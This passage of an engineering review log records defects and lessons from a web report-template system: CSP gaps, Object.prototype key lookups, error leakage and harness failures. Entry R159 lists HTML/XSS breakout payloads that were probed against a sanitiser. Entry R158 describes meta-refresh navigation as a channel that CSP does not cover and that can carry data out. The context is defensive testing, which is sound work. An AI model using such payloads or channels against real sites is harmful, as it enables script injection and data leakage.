| **R157** | 🔴 **R130 recurred inside the main plan four days after being raised against the companion — and the section it hit was the one written to close R116.** § "The CSP header, byte-for-byte" still opened *"Pinned 2026-08-22 to close R116. W19 asserts this exact string as a literal and W21 asserts the route emits it"*, above the constant `script-src 'unsafe-inline' https:` policy, while § 6b of the UI doc carried the derived two-list value and its own amendment banner. Both halves of that sentence were false, and two further paragraphs in the same section asserted the opposite of what the code now does (*"permit any `https:` origin"*; *"a pinned CDN allowlist … is not done now"* — it is done). **An executor greps `design/` for the CSP and finds two live answers**, which is the exact condition R130 was raised to eliminate. The lesson is narrow and mechanical: **when a value moves, the amendment banner goes on the section that HELD it, not only on the section that now holds it.** Revision 5 amended W19's criterion, W21's criterion and § 6b, each correctly — and left the origin section reading as authoritative, because nobody edits a section they are not changing. The R154 citation grep does not catch this class (the heading still exists and still matches), so the companion check is: **grep for the pinned VALUE, not the section name**, and confirm every copy either is the live one or carries a banner. Two documents; one grep. |
| **R158** | **The navigation channel is ungoverned by CSP, and after W19 that is the ONLY breadth left in the policy that no directive touches.** R152 fixed the script-execution half of R146's closing note, so a host reached only by `<img>` or by a `meta[http-equiv=refresh]` no longer becomes a script source. But **no CSP directive governs a navigation**: `frame-src` covers nested contexts, `form-action` covers form submission, and a sandboxed frame with `allow-scripts` may still navigate *itself* — the directive that would have covered it, `navigate-to`, was specified and never shipped. So a `meta`-refresh target reaches `img-src`/`font-src` and is otherwise unconstrained, and it can carry data in its path. § 6b's headline claim — *"the bound moves from every HTTPS host to the hosts a human approved for this template"* — is therefore **true for fetches, and true for navigations only because W24 shows the human the host**, not because the policy stops it. That is a real bound and it is not the same bound. Recorded rather than closed: the closure is a review-screen property (W24 must render meta-refresh and `object > param` origins conspicuously enough that a human reads them as *navigation*, not as another CDN), which is why W30 computes them at all. **The general shape is worth keeping: a defence-in-depth story that names two layers is only as strong as the layer that actually covers the channel, and "the CSP bounds it" was doing rhetorical work here that the CSP cannot do.** |
| **R159** | **`RAW_TEXT_ELEMENTS` omits `iframe` and `plaintext`, so a slot NESTED INSIDE one is filled — the adjacent hazard Ruling 2 does not cover.** W19's guard checks the slot element's **own** tag; it says nothing about its ancestors. `template.ts`'s `RAW_TEXT_ELEMENTS` is what would otherwise stop a slot being *recorded* inside one, and it lists neither, so `<iframe><div data-wolf-slot="a">x</div></iframe>` and its `plaintext` twin both validate and get filled. **Probed, not assumed:** six breakout payloads against each (`</iframe><script>`, `x</iframe><img src=x onerror=…>`, the `title=`-attribute variant, the character-reference variant, and the `plaintext` equivalents) produced **no execution and no event attribute** — DOMPurify's output cannot contain the closing tag the breakout needs. `plaintext` swallows the rest of the document as text, but identically with benign content, so that is inherent to a template containing `<plaintext>` at all. **Not a W19 defect and not blocking** — it belongs to `template.ts`'s `RAW_TEXT_ELEMENTS`, the W16/W30 surface. It is logged because it is closed today by the same dependency R150(3) was: a library's behaviour rather than our rule. **Whoever next opens `template.ts` adds both.** |
| **R160** | 🔴 **R156's class travelled: the SAME defect was already live on `main`, in merged code, falsifying a shipped ticket's own criterion — and it was found only because the verifier was asked whether one instance had siblings.** `api/src/hypothesis/spec.ts:244`'s `present(record, key)` reads `record[key]` unguarded. 🔴 **The surface is SEVEN keys, not one — see R162; this entry originally said "the only one" and was wrong.** `LABEL_VALUE_PATTERN` is `/^[A-Za-z0-9]([-A-Za-z0-9_.]*[A-Za-z0-9])?$/` and accepts **uppercase**, so every one of `constructor`, `hasOwnProperty`, `isPrototypeOf`, `propertyIsEnumerable`, `toString`, `valueOf` and `toLocaleString` is a legal metric slug, and `present({}, k)` returned `true` for all seven. Measured independently, twice, by derivation from `Object.getOwnPropertyNames(Object.prototype)` rather than by guessing spellings. Only the `__dunder__` names are excluded, and only because they start with `_`. The live site is `api/src/report/series.ts:183-187`, the one call site of eleven whose key is **model-chosen**: a spec metric named any of the seven, with no dataset written, skips the missing-dataset branch and throws `TypeError: Cannot read properties of undefined (reading 'length')` — measured, all seven, one control slug `OK`. 🔴 **`toString` and `valueOf` are words a model writing a spec might plausibly reach for; `constructor` is not** — so the realistic reachability is much higher than the first framing implied. That is the exact failure **W18's own criterion forbids** — *"A metric whose dataset is missing appears with empty arrays and `version: 0`, never absent — an absent key makes the locked template's chart code throw, and the template cannot be fixed without an amendment."* W18 passed with **zero fix rounds** and five mutations, and its criterion was correct, well-tested and still shipped a violation, because every fixture used an ordinary slug. Four lessons. (1) 🔴 **When a defect class is found, ask immediately whether it has siblings — and ask it of MERGED code, not only of the ticket in hand.** One instance of a class rarely travels alone, and the second one here was three tickets old, on `main`, and past its own verification. This question is now a standing item in every verifier brief. (2) **A cast is where a proof gets laundered into an assumption.** `as SeriesInput` carried it past `noUncheckedIndexedAccess` — the setting that exists to catch exactly this — and the comment above it asserted that `present()` "has just proven" the value is neither `undefined` nor `null`. The comment was the tell: it stated a proof in prose because the type system had been told to stop asking. **Any `as` that silences `noUncheckedIndexedAccess` is a claim about runtime that needs a runtime test, not a comment.** (3) **Fix the helper, not the call site.** Eleven call sites pass fixed literals and are safe today; one is model-chosen and is not. Patching the one leaves the class open for the twelfth. (4) Ruled 2026-08-26 to ride along with W19's fix round rather than take its own ticket: it is one line plus two tests, the class was already open in the wave, and the alternative was knowingly merging W19 on top of a live 500. File ownership on `spec.ts`/`series.ts` suspended on the same basis as W19's `template.ts` edit — those tickets are merged and nothing was in flight. |
| **R161** | **The same shape, checked and CLEARED — recorded because a cleared probe is evidence and re-probing it later is waste.** `template.ts:1044`'s `NAMED_REFERENCES[body.toLowerCase()] ?? match` is structurally identical to R156 and R160: `&constructor;` makes the `??` fall through to the `Object` function rather than to `match`. Measured across four channels (text content, `href`, an `src` path, a meta-refresh target): it fails **closed** every time — two cases pass through unchanged, two are refused with the correct "must be an absolute `https:` URL" error, and no `remoteOrigins` pollution results. Every other bracket read in `frame.ts` and `template.ts` is numeric indexing into a string or array, which `noUncheckedIndexedAccess` already types as possibly-undefined; `drift.ts` reads `Object.keys` rather than indexing; `kinds.ts` builds from `Object.entries` and only writes. **The sweep is therefore complete for the report layer**, which is worth stating explicitly: R160's lesson is "ask whether the class has siblings", and the answer to that question is only useful if someone records where the search ended. |
| **R162** | 🔴 **"Once again it is the only one" — an orchestrator carried a property of ONE regex onto a DIFFERENT regex, understating a live defect's surface by a factor of seven. Eighteenth instance.** R160's instruction said `LABEL_VALUE_PATTERN` accepts `constructor` and that it is "once again the only `Object.prototype` key that gets through". True of `SLOT_ID_PATTERN` — `/^[a-z][a-z0-9-]{0,31}$/`, lowercase-only, where `constructor` genuinely is the sole survivor. **False of `LABEL_VALUE_PATTERN`**, which is `/^[A-Za-z0-9]([-A-Za-z0-9_.]*[A-Za-z0-9])?$/` and accepts uppercase: `constructor`, `hasOwnProperty`, `isPrototypeOf`, `propertyIsEnumerable`, `toString`, `valueOf` and `toLocaleString` are **all** legal metric slugs, and all seven crashed `buildSeriesPayload`. The verifier reached the same wrong count by a different route — it probed the **lowercase** spellings `tostring`, `valueof`, `hasownproperty`, which correctly return `false` under the *slot* pattern's charset, and read that as the whole surface. Two independent parties, one wrong number, because both were reasoning about a charset instead of enumerating against it. Four lessons. (1) 🔴 **"Once again" is a smell.** The phrase asserts that this case is the previous case; it is exactly the sentence in which an unexamined transfer hides, and here it moved a fact across two regexes that differ in the one dimension that mattered. When you write it, check it. (2) **Enumerate, do not spell.** `Object.getOwnPropertyNames(Object.prototype).filter(p.test)` is one line and cannot be wrong about spellings, casing or a runtime that adds a name later; hand-listing candidates tests your imagination, not the pattern. The shipped test now derives the list that way, **with a guard test asserting it is exactly those seven**, so it cannot go vacuously empty. (3) It is the **R147 shape** yet again: right about the value (fix `present()`, not the call site — which holds for one key or seventy), wrong about the reason, and the wrong reason survived precisely because the value was right. The code was unaffected; the *test* would have been seven times too narrow had the implementer taken the instruction literally. (4) 🔴 **Realistic reachability changed with the count.** `constructor` as a metric slug is nearly unimaginable from a model; `toString` and `valueOf` are not. A defect's severity was understated by the same error that understated its surface, and severity is what decides whether something rides along or waits. |
| **R163** | **R142's sweep is DISCHARGED — every pending ticket's enumerated vocabulary now checked against the code's exported unions, mechanically. One real gap, no mismatches.** R142 opened when W14's ticket named a `Reason` (`stale_series`) that does not exist, three days after R67 had corrected that spelling — "the log knows things the tickets do not". The sweep was run two ways over all eleven pending tickets. **(1) Near-miss detection:** every backticked snake_case token, flagged when it shares a head or tail word with a real union member but is not one. Two hits, both false positives on inspection — `forged_row` (a `Tamper.reason`, a vocabulary the first pass had not loaded) and `stale_count` (a wire field W13 already ships and W27 must fill). **Zero real mismatches: no pending ticket names a value the code does not define.** **(2) Completeness detection:** for every ticket naming two or more members of one union, which members it omits. Three hits, all legitimate prose rather than enumerations — but one of them is a **defect of a different kind**, which is the sweep's real yield: **W27 names five of the six `HypothesisStatus` values and never `draft`**, while `draft` is non-terminal, so W13's client-side filter passes it through and draft rows *do* reach the board. W27's server-side tier computation therefore has a `draft` branch that no fixture in its own ticket would exercise — R146's shape, in the one function the board's ordering depends on. Handed to W27 in its Notes. Two lessons. (1) 🔴 **A vocabulary check finds two different defects and only one of them is a misspelling.** The valuable half was not "this token is wrong" but "this list is short" — an omission has no token to grep for, and is invisible to the check everyone thinks of first. **Check completeness, not just correctness.** (2) The check is ~30 lines and took minutes; R142 sat open for two days as "a sweep to do". **A mechanical check that is described rather than written is not a check** — the same lesson R154's citation grep taught in the same week, and both are now standing pre-wave items. |
| **R164** | 🔴 **Two comments in the same process assert opposite concurrency facts, and the one a route author reads first is the wrong one.** `app.ts:109-111` says *"ONE Orange client and ONE hypothesis store for the process. The store's transition mutex is per INSTANCE, not per process (W5's Notes), so a second store built elsewhere would silently stop serialising transitions."* `index.ts:84-88` says the opposite — *"This is a SECOND Orange client and a second hypothesis store… The per-id transition mutex is shared at module scope in `store.ts` precisely so those two stores still serialise state changes against each other."* Measured: `store.ts:1020` holds `SHARED_TRANSITION_MUTEX = new KeyedMutex()` at module scope, and `createTransitioner` is passed it with a comment that begins "⚠️ PROCESS-WIDE, not per store instance". **`index.ts` is right and `app.ts` is stale** — W8 wrote it, and W10 falsified it when it introduced the shared mutex to close the `live → challenged` versus `/verdict` race. Three lessons. (1) 🔴 **A stale comment about concurrency is worse than no comment, because it is load-bearing for a decision nobody will re-derive.** A route author reading `app.ts` believes a second store is unsafe; the plausible next actions are "fixing" `index.ts` to thread the store through, or silently avoiding a correct design. Neither shows up in a test. (2) **The defect was invisible to every check this project runs.** Both files typecheck, all 1548 tests pass, mutation testing cannot reach a comment, and each file is internally coherent — it is only visible by reading *two* files and noticing they disagree. **When a ticket introduces a process-wide invariant, the comment at every site that reasons about it is part of the change**, and W10 updated one of two. (3) This also **closes R123**, which recorded "wolf-api builds TWO Orange clients and TWO hypothesis stores — fold into W21" as though the duplication were the problem. It is not: the duplication is deliberate, correct and documented at the site that does it. The problem was the *other* site's account of it. R123 was right that something was wrong here and wrong about what — the R147 shape once more, this time in the log itself. |
| **R165** | 🔴 **Three live defects on one HTTP path, all invisible because no test had ever POSTed a realistic payload.** W21 found them by building the route, not by reading. (1) **`express.json()`'s default limit is 100kb; `WOLF_REPORT_MAX_BYTES` defaults to 512000** — so every template between those two numbers was refused by the **body parser**, before any Wolf code ran, and the configured budget was simply unreachable. (2) The same rejection **fell through to `internal`**, so a caller who sent an oversized template was told the *server* had a bug — R39's rule running in the opposite direction: a caller's error must not be classified as ours, just as ours must not be classified retryable. (3) 🔴 **`createErrorHandler` echoed an explicitly-constructed `internal` error's `message` AND its `details` to the client.** § "Shared error taxonomy" says an `internal` message "is **not** passed through to the client — a stack trace or a credential in a thrown error must not reach a response body", and that held **only for an unrecognised throw**; `new WolfError("internal", …)` went straight out, with details. W19's `composeFrame` and `template.ts` construct exactly those, carrying slot ids, tag names and origin lists. Three lessons. (1) **A limit that is configured in one layer and enforced in another is not configured at all.** Nobody wrote a bug here; two independently reasonable defaults met, and the gap between them was a dead zone no test occupied. **Where a budget exists, test the byte just under and the byte just over it, in the real transport.** (2) **A rule stated for a class is not implemented for the class until every member is routed through it.** The taxonomy's redaction rule was written once and implemented for one of two paths, and the untested path was the one the report layer actually uses. The fix belongs at the single place every error leaves the process — the same "fix the helper, not the call site" shape as R160. (3) **All three were reachable only from the transport.** Unit tests of the handler, the validator and the composer all passed; the defects lived in the seams between express, body-parser and our taxonomy. That is an argument for route-level tests that drive the real app, not an argument for more unit tests. |
| **R166** | 🔴 **§ "HTTP routes added" pinned a 422 that the code could not produce — and a MERGED file stated the falsehood as fact.** `validateTemplate` throws W16's `templateValidationError`, kind `invalid`, whose default status is **400**. But `api/src/report/sanitise.ts:257` says the function exists "so W21's route renders one 422 with a per-path list". Any executor who trusted that sentence would have shipped a 400 against a pinned 422 **with every one of their own tests passing**, because their tests would assert what their code did. Nineteenth instance of the standing lesson, and the first where the false text was in **source** rather than in a design document — which is strictly worse: a design doc is read once with suspicion, a doc comment beside the function is read as the function's own account of itself. **The rule: a comment that asserts what a DIFFERENT module will do is a claim about code the author cannot see, and belongs in that module's tests, not in this module's prose.** Where it must be said, say what is true here and name the mechanism that supplies the rest — "throws `invalid`; the route wraps it to 422" — so the reader knows a wrapper exists rather than believing one does not. |
| **R167** | 🔴 **The accept path kept the MACHINE's rationale and discarded the HUMAN's, inverting the design's spine — and no pinned format had anywhere to put it.** `POST …/report-amendment` takes a `rationale`; § "Memory kinds" pins `report-template` content as line 1 = `structureHash`, rest = the fragment; and unlike W9's spec amendment, the report layer has no state row carrying a decision. So the reason a human accepted or rejected a proposed template was durable **nowhere**. "Agent proposes, human decides, enforced by provenance" is the design's own summary of itself, and the half being recorded was the agent's. The implementer was right to refuse to invent a field in a pinned format and to escalate instead. **Ruled 2026-08-26:** the system already has the answer and it is the one it uses everywhere else — **memories are append-only, so deciding IS appending.** A decision appends a second `kind=report-amendment` row for the same `name`, with `status: accepted|rejected` and the human's rationale as line 1, through a new `reportDecisionLabels` builder in `kinds.ts` (not inline labels — a second spelling of a vocabulary is how vocabularies drift). **On the reject path too:** a rejection's reason is worth exactly as much as an acceptance's, and is the one a later reader is more likely to need. The general lesson: **when a route accepts a field, trace it to storage before accepting the ticket.** A parameter that is validated, logged and returned looks handled at every point except the only one that matters. |
| **R168** | **R153's failure mode arrived through the SHELL rather than through the test runner, and the only signal was a control that had been put there for a different reason.** W21's mutation driver was piped through `head -160`; SIGPIPE killed it mid-mutation, leaving the tree mutated. The next sweep's snapshot therefore baked that mutation into its own **baseline**, and from there on every result carried one spurious extra dead test. Nothing in the per-mutation output said so — the results looked plausible, merely noisier. The only thing that caught it was `CONTROL-final` coming back non-zero. Three lessons. (1) **A mutation harness needs a control at the END as well as the beginning.** An opening control proves the harness can distinguish red from green; a closing one proves *the tree you finished with is the tree you started with*. Only the second catches a driver that died half way. (2) **`| head` is a trap for any long-running driver**, because SIGPIPE terminates the producer at an arbitrary point and the exit status belongs to the pipeline, not the work. Redirect to a file and read the file. (3) The deeper point is R153's, generalised past vitest: **the harness is code, it can fail, and it fails in the direction that manufactures confidence.** Every prior instance was the runner; this one was the shell around it. Whatever wraps the runner needs the same suspicion the runner gets. |
| **R169** | **`readLockedSpec` now exists in FOUR private copies — the ownership table's cost, made visible.** The poller, the series router, the hypotheses route and the report route each carry their own. The `api/src/hypothesis/store.ts` ownership row forbids any of them lifting it into the store, and each ticket correctly wrote its own rather than reaching across. The rule was right — concurrent edits to `store.ts` are exactly what it exists to prevent — but the accumulated cost is **four copies of one trust rule that can drift independently**, and a change to what "locked" means now has four sites. Recorded as a **consolidation ticket, not to be done inside another ticket**: lifting it is a `store.ts` edit and belongs to something that owns that file when nothing else is in flight. The general lesson worth keeping: **a serialisation rule that prevents collisions also prevents consolidation, and the debt is silent because every individual instance is correct.** Ownership tables should be read periodically for what they have *accumulated*, not only consulted for what they *forbid*. |
